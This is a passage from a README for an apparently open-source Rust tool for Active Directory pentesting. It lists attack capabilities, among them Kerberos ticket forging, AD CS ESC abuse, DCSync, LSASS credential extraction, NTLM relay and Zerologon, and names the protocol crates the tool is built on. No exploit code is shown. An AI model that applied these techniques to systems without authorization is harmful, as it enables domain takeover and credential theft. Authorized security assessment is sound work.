- BloodHound-CE compatible bundle export
- SAMR / LSAT / SRVSVC / MS-RRP enumeration
- ADIDNS zone dump + wildcard record detection
- AD CS enterprise CA discovery + ESC8 web-enrollment probe
- DC posture: LDAP signing / channel binding / Spooler / RemoteRegistry

</details>

<details>
<summary><b>🔑 Kerberos</b></summary>
<br/>

- AS-REP roast + Kerberoast (RC4 + AES256)
- Ask-TGT (`--asktgt`) + password spray
- Pass-the-ticket over sealed SMB2 + AP-REQ
- Golden ticket (RC4 + AES256, PAC KB5020805-compliant)
- Silver ticket (per-service)
- **Diamond ticket** *(library only, via [`ms-pac-forge`](https://crates.io/crates/ms-pac-forge) — no CLI subcommand yet)* — identity-swap on a real TGT envelope (detection evasion)
- FAST armor (RFC 6113)
- PKINIT + Shadow Credentials

</details>

<details>
<summary><b>🎭 Delegation abuse</b></summary>
<br/>

- Unconstrained delegation
- Constrained delegation (S4U2Self + S4U2Proxy)
- RBCD write + exploit chain (`msDS-AllowedToActOnBehalfOfOtherIdentity`)

</details>

<details>
<summary><b>📜 AD CS enrollment — full ESC pack</b></summary>
<br/>

- **ESC1** — enrollee-supplied UPN SAN in CSR
- **ESC3** — CMC EnrollOnBehalfOf via caller-supplied Enrollment Agent cert
- **ESC6** — SAN as CA `pctbAttribs` request-attribute
- **ESC8** — Web-enrollment relay chain
- **ESC15** — EKUwu / CVE-2024-49019 via Microsoft Application Policies extension
- **ESC4** — write template attributes to make a template ESC1-vulnerable

</details>

<details>
<summary><b>🗝️ Secrets extraction</b></summary>
<br/>

- DCSync (DRSUAPI, single-account or full domain)
- RRP secretsdump (local SAM + SECURITY + SYSTEM offline decrypt)
- LSASS minidump credential hunt (offline)
- LAPS v1 (`ms-Mcs-AdmPwd`) + LAPS v2 (`msLAPS-EncryptedPassword` via GKDI)
- gMSA `msDS-ManagedPassword` decrypt

</details>

<details>
<summary><b>🕸️ Coercion + relay + lateral movement</b></summary>
<br/>

- Coerce (RPRN / EFSR / DFSNM / FSRVP)
- NTLM relay → LDAP / SMB / AD CS Web (ESC8)
- LLMNR + NBT-NS poison → NetNTLMv2 capture
- Remote exec: SVCCTL · TSCH (atexec) · WMI (DCOM) · WinRM
- Zerologon **safe-detect** by default (`attack zerologon` runs read-only detection); a destructive `--exploit` path exists and requires explicit runtime confirmation
- DCShadow (rights enumeration + prep/cleanup shipped; DRSUAPI push path present, live validation owed)
- Server 2025 **BadSuccessor** (dMSA)

</details>

<br/>

<img src="docs/divider.svg" width="100%" alt=""/>

<br/>

## 🧱 Built on a from-scratch Rust ecosystem

<p align="center">
  <img src="docs/ecosystem.svg" alt="ADhammer application on top of icedracon — published pure-Rust protocol crates" width="100%"/>
</p>

<br/>

ADhammer is one binary on top of **published standalone icedracon crates**, each doing one job well and each `cargo add`-able on its own. Every crate ships an explicit *"what this does NOT do"* section, is MIT-licensed, and works standalone. Exact crate counts and download totals change over time; the important constant is that the protocol stack is reusable outside the binary.

**Two brands, one project:**

- **ADhammer** — the application. AD security assessment + live attack-path validation.
- **icedracon** — the ecosystem. Pure-Rust implementations of Microsoft security protocols. Adopt one crate (`cargo add dcerpc`) without adopting the whole toolkit.

<details open>
<summary><b>The load-bearing crates</b></summary>
<br/>

| Layer | Crates |
|:---|:---|
| **Transport** | [`dcerpc`](https://crates.io/crates/dcerpc) · [`smb2-client`](https://crates.io/crates/smb2-client) · [`ms-ndr`](https://crates.io/crates/ms-ndr) |
| **Auth / crypto** | [`ntlmssp`](https://crates.io/crates/ntlmssp) · [`credssp`](https://crates.io/crates/credssp) · [`dpapi-ng`](https://crates.io/crates/dpapi-ng) · [`dpapi-offline`](https://crates.io/crates/dpapi-offline) · [`ms-gkdi`](https://crates.io/crates/ms-gkdi) |
| **Kerberos** | [`ms-pac`](https://crates.io/crates/ms-pac) · [`ms-pac-forge`](https://crates.io/crates/ms-pac-forge) · [`ms-kile-fast`](https://crates.io/crates/ms-kile-fast) · [`ms-pkca`](https://crates.io/crates/ms-pkca) · [`ccache-io`](https://crates.io/crates/ccache-io) *(new — MIT ccache + .kirbi codec)* |
| **DCE/RPC protocols** | [`ms-drsr`](https://crates.io/crates/ms-drsr) · [`ms-nrpc`](https://crates.io/crates/ms-nrpc) · [`ms-samr`](https://crates.io/crates/ms-samr) · [`ms-lsat`](https://crates.io/crates/ms-lsat) · [`ms-tsch`](https://crates.io/crates/ms-tsch) · [`ms-even6`](https://crates.io/crates/ms-even6) · [`ms-tds`](https://crates.io/crates/ms-tds) · [`ms-coerce`](https://crates.io/crates/ms-coerce) · [`ms-scmr`](https://crates.io/crates/ms-scmr) *(new)* · [`ms-bkrp`](https://crates.io/crates/ms-bkrp) *(new)* |
| **AD CS** | [`ms-crtd`](https://crates.io/crates/ms-crtd) · [`ms-icpr`](https://crates.io/crates/ms-icpr) · [`ms-csra`](https://crates.io/crates/ms-csra) |
| **NTDS / secrets** | [`ese-parser`](https://crates.io/crates/ese-parser) · [`ntds-parse`](https://crates.io/crates/ntds-parse) · [`lsass-parse`](https://crates.io/crates/lsass-parse) |
| **AD / GPO / audit** | [`ad-acl`](https://crates.io/crates/ad-acl) · [`msldap-ext`](https://crates.io/crates/msldap-ext) · [`gpo`](https://crates.io/crates/gpo) · [`gpo-forge`](https://crates.io/crates/gpo-forge) · [`preg`](https://crates.io/crates/preg) · [`ms-dnsp`](https://crates.io/crates/ms-dnsp) · [`ms-fve`](https://crates.io/crates/ms-fve) · [`ms-rodc`](https://crates.io/crates/ms-rodc) |
| **Relay / lateral** | [`ntlm-relay`](https://crates.io/crates/ntlm-relay) · [`llmnr-poison`](https://crates.io/crates/llmnr-poison) · [`winrm-pentest`](https://crates.io/crates/winrm-pentest) |
| **Windows-local (host-side)** | [`windows-sddl`](https://crates.io/crates/windows-sddl) · [`windows-lsa`](https://crates.io/crates/windows-lsa) · [`windows-scm`](https://crates.io/crates/windows-scm) · [`windows-token`](https://crates.io/crates/windows-token) · [`windows-wmi-com`](https://crates.io/crates/windows-wmi-com) · [`windows-sspi-shim`](https://crates.io/crates/windows-sspi-shim) · [`windows-eventlog-native`](https://crates.io/crates/windows-eventlog-native) |
| **BloodHound export** | [`bloodhound-export`](https://crates.io/crates/bloodhound-export) |

</details>

Full crate list on **[crates.io/users/zevs](https://crates.io/users/zevs)**.

<br/>

<img src="docs/divider.svg" width="100%" alt=""/>

<br/>

## 📚 Deep dives

> **Featured on dev.to** — a detailed write-up of how the from-scratch Rust protocol stack came together.

- **Write-up** — *[I built a full Active Directory pentest + audit tool in Rust on a from-scratch protocol stack](https://dev.to/pumadracon/i-built-a-full-active-directory-pentest-audit-tool-in-rust-on-a-protocol-stack-i-wrote-from-fl5)* (dev.to)
- **Changelog** — per-release notes live in **[GitHub Releases](https://github.com/icedracon/adhammer/releases)** and [CHANGELOG.md](CHANGELOG.md)
- **Benchmarks** — full methodology + raw log in [`docs/BENCHMARKS.md`](docs/BENCHMARKS.md)
- **Ecosystem tour** — [`crates.io/users/zevs`](https://crates.io/users/zevs)

<br/>

## 🧪 Test

CI runs the full workspace test suite on every push (100+ unit + integration tests across the CLI and 11 sub-crates). Green means ship. Reproduce locally:

```sh
cargo test --workspace
```

<br/>

## 🤝 Contributing

PRs welcome — especially for new AD CS ESC variants, additional coerce endpoints, and cross-forest trust auditing. Open an issue first for anything larger than a bug fix.

## ☕ Support

ADhammer is MIT-licensed and independently developed. Every contribution funds another wire primitive, another live-validation session against a real DC, another release.

**USDT (TRC20 / Tron)** — instant, low-fee, no gatekeepers:

<table>
<tr>
<td width="200"><img src="docs/support-usdt-trc20.png" alt="USDT-TRC20 QR" width="180"/></td>
<td>

```
TDKrs1rjiUaB1JnvWRDaoxM7o1jjVuDTDW
```

Scan from any wallet, or copy-paste the address. Tron network, minimum ~1 USDT to cover network fee.

</td>
</tr>
</table>

<sub>GitHub Sponsors + Ko-fi channels coming as Stripe onboarding clears. Until then, the address above is the fastest path.</sub>

## 🛡️ Security

Vulnerabilities: report privately per [SECURITY.md](SECURITY.md). ADhammer contains working offensive techniques — use only against systems you own or are explicitly authorized to test.

## 📄 License

MIT © the [`icedracon`](https://github.com/icedracon) project.

<br/>

<p align="center">
  <sub>Built by <a href="https://github.com/zevs">@zevs</a> · <a href="https://crates.io/users/zevs">crates.io/users/zevs</a></sub>
</p>
